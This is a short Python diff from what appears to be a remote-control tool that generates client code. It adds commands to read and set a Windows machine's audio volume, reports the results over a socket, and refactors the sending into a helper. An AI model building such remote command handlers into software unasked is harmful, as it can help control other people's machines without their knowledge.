@@ -18,7 +18,7 @@ def set_audio_range():
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
     range_vol = volume.GetVolumeRange()
-    s.sendall(('[*]Max decibel level(100%) : ' + str(range_vol[1]) + '\\n[*]Minimum decibel level(0%) : ' + str(range_vol[0])).encode())
+    main_send('[*]Max decibel level(100%) : ' + str(range_vol[1]) + '\\n[*]Minimum decibel level(0%) : ' + str(range_vol[0]), s)
 
 
 def set_audio(data):
@@ -27,7 +27,7 @@ def set_audio(data):
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
     volume.SetMasterVolumeLevel(float(number), None)
-    s.sendall(('[+]Set volume to : ' + str(number)).encode())''')
+    main_send('[+]Set volume to : ' + str(number), s)''')
         config.logics.append('''
             elif command == "set_audio":
                 set_audio(data)''')
